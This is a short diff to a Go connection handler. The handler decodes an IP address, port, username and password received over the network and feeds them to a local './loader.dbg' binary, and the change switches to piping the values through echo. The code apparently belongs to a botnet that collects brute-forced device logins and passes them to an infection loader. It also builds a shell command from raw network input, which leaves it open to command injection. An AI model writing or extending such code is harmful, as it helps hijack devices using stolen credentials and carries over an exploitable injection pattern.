@@ -103,7 +103,7 @@ func handleConnection(conn net.Conn) {
 		        log.Fatalln(err)
 		    }
 		//runcmd("mkdir test", true);
-		runcmd(fmt.Sprintf("./loader.dbg %d.%d.%d.%d:%d %s:%s", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf)), true)
+		runcmd(fmt.Sprintf("echo %d.%d.%d.%d:%d %s:%s | ./loader.dbg", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf)), true)
 	}
 	
 }
